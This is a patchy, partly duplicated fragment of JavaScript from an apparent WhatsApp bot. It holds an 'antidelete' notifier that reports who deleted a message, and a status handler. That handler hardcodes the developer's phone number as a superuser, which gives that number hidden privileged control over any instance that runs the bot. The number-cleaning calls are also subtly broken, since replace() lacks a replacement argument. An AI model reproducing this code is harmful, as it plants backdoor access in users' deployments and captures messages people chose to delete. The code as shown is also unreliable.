...
function createNotification(deletedMessage) {
  ...
  let notification = `*🤧ALONE ANTIDELETE❣️*\n\n`;
...
function createNotification(deletedMessage) {
  const deletedBy = deletedMessage.key.participant || deletedMessage.key.remoteJid;
  let notification = `*😈ALONE ANTIDELETE👿*\n\n`;
  notification += `*Time deleted🥀:* ${new Date().toLocaleString()}\n`;
  notification += `*Deleted by🌷:* @${deletedBy.split('@')[0]}\n\n*Powered by Toputech*\n\n`;
  return notification;
}
...
if (conf.AUTO_LIKE_STATUS === "yes") {
    ...
    zk.ev.on("messages.upsert", async m => {
      ...
      const superUserNumbers = [servBot, "255673750170", conf.NUMERO_OWNER].map(s => s.replace(/[^0-9]/g) + "@s.whatsapp.net");
      const allAllowedNumbers = superUserNumbers.concat(sudo);
      const superUser = allAllowedNumbers.includes(auteurMessage);
      var dev = ['255673750170'].map(t => t.replace(/[^0-9]/g) + "@s.whatsapp.net").includes(auteurMessage);
